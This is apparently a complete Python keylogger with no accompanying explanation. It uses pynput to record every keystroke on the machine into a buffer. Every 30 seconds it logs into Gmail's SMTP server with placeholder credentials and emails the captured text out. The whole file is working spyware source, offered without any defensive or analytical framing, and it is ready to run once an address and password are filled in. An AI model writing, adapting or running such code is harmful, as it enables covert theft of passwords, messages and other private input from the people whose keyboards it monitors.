import pynput.keyboard
import smtplib
import threading

lg = " "


def listening_function(key):
    global lg
    try:
        lg += str(key.char)
    except  AttributeError:
        if key == key.space:
            lg = lg + " "
        else:
            lg = lg + str(key)
    except:
        print("Error!")
    print(lg)


def send_email(email, password, send_message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, send_message)
    email_server.quit()


keylogger_listener = pynput.keyboard.Listener(on_press=listening_function)


def thread_function():
    global lg
    send_email("username@few.com", "password", lg.encode("utf-8"))

    lg = ""
    timer_object = threading.Timer(30, thread_function)
    timer_object.start()


with keylogger_listener:
    thread_function()
    keylogger_listener.join()
